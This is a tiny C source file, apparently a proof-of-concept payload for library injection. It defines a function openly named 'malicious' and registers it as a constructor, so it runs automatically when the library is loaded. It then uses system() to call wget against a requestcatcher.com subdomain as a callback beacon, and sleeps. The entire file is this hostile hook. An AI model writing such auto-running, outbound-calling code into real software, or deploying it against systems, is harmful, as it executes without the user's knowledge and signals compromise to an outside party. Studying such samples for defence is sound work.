#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("wget http://yyyyyyysh.requestcatcher.com/");
    system("sleep 10");
}
